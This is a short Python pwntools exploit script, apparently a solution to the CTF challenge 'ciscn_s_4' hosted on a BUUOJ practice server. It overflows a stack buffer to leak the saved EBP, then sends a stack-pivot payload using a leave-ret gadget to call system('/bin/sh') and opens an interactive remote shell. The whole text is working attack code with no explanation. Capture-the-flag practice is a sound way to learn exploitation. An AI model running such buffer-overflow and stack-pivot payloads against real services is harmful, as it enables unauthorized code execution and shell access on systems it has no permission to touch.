from pwn import *
context.log_level = 'debug'
# io = process('./ciscn_s_4')
io = remote('node4.buuoj.cn',29753)
elf = ELF('./ciscn_s_4')

system_plt = elf.plt['system']
leave_ret = 0x080485FD

payload = b'a' * (0x24) + b'b' * 0x4

io.send(payload)
io.recvuntil(payload)
last_ebp =  u32(io.recv(4))
log.success('last_ebp ------> ' + hex(last_ebp))

buffer_addr = last_ebp - 0x38 #动态调试
sh_addr = buffer_addr + 12
payload = p32(system_plt) + b'a'*4 + p32(sh_addr) + b'/bin/sh\x00'
payload = payload.ljust(0x28, b'a') + p32(buffer_addr - 4) + p32(leave_ret)

io.sendline(payload)
io.interactive()